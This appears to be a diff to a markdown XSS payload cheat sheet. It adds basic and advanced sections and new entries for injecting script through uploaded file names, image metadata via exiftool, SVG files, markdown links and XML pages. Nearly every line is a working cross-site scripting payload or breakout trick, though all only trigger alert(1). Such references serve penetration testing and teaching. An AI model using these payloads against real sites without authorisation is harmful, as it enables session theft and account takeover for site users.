@@ -1,4 +1,4 @@
-# XSS Payloads 
+# XSS Cheat Sheet (Basic)
 1. Basic payload
 ```html
 <script>alert(1)</script>
@@ -38,6 +38,7 @@
 ```
 
 4. Add </tag> when the input inside or between opening/closing tags, tag can be <a>,<title,<script> and any other HTML tags
+    
 ```html
 </tag><script>alert(1)</script>
 "></tag><script>alert(1)</script>
@@ -45,12 +46,12 @@
 
 * Example source code
 ```html
-<a class="item-pagination flex-c-m trans-0-4 active-pagination" href="https://target.com/1?status=REFLECTED_HERE">1</a>
+<a href="https://target.com/1?status=REFLECTED_HERE">1</a>
 ```
 
 * After input the payload
 ```html
-<a class="item-pagination flex-c-m trans-0-4 active-pagination" href="https://target.com/1?status="></a><script>alert(1)</script>">1</a>
+<a href="https://target.com/1?status="></a><script>alert(1)</script>">1</a>
 ```
 
 5. Use when input inside an attribute’s value of an HTML tag but > is filtered
@@ -84,10 +85,11 @@
 * After input the payload
 ```html
 <script>
-    var sitekey = '</script>alert(1)</script>';
+    var sitekey = '</script><script>alert(1)</script>';
 </script>
 ```
 
+# XSS Cheat Sheet (Advanced)
 7. Use when input lands in a script block, inside a string delimited value.
 ```html
 '-alert(1)-'
@@ -244,4 +246,29 @@ ${alert(1)}
 </html>
 ```
 
-*Will be updated again!
+14. XSS in filename (File Upload) Use when uploaded filename is reflected somewhere in target page
+```
+"><svg onload=alert(1)>.jpeg
+```
+
+15. XSS in metadata (File Upload) Use when uploaded metada is reflected somewhere in target page (using exiftool)
+```
+$ exiftool -Artist='"><script>alert(1)</script>' dapos.jpeg
+```
+
+16. XSS with SVG file (File Upload)
+```
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
+```
+
+17. XSS via markdown
+```
+[Click Me](javascript:alert('1'))
+```
+
+18. XSS in XML page
+```
+<a:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</a:script>
+```
+> Add a "-->" to payload if input lands in a comment section
+> Add a "]]>" if input lands in a CDATA section
